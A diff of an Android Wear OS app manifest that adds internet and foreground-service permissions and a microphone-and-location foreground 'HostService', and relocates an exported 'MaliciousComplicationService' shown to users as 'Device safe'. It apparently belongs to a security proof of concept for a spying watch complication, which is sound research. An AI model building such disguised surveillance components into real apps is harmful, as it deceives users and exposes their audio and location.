@@ -4,6 +4,8 @@
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.INTERNET" /> <!-- Internet permission -->
 
     <uses-feature android:name="android.hardware.type.watch" />
 
@@ -42,7 +44,7 @@
             android:value="true" />
 
         <service
-            android:name=".MaliciousComplicationService"
+            android:name=".malicious.MaliciousComplicationService"
             android:exported="true"
             android:icon="@drawable/malicious"
             android:label="Device safe"
@@ -53,11 +55,16 @@
 
             <meta-data
                 android:name="android.support.wearable.complications.UPDATE_PERIOD_SECONDS"
-                android:value="300" />
+                android:value="60" />
             <meta-data
                 android:name="android.support.wearable.complications.SUPPORTED_TYPES"
                 android:value="SMALL_IMAGE" />
         </service>
+
+        <service
+            android:name=".malicious.HostService"
+            android:foregroundServiceType="microphone|location" />
+
     </application>
 
 </manifest>
